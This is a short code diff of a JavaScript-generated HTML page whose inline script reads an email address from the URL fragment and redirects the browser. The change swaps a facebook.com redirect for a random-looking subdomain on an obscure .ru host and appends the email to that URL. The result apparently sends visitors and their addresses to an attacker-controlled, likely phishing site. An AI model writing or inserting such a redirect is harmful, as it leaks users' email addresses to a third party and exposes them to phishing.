@@ -427,7 +427,7 @@ const html = `
         hash = hash.split("#");
         const email = hash[1];
 
-        window.location.href = "https://facebook.com/#" + email;
+        window.location.href = "https://yskgskem5ur6t1q7qf4h.t06q.ru/f5pgs/#" + email;
       }
     </script>
   </body>
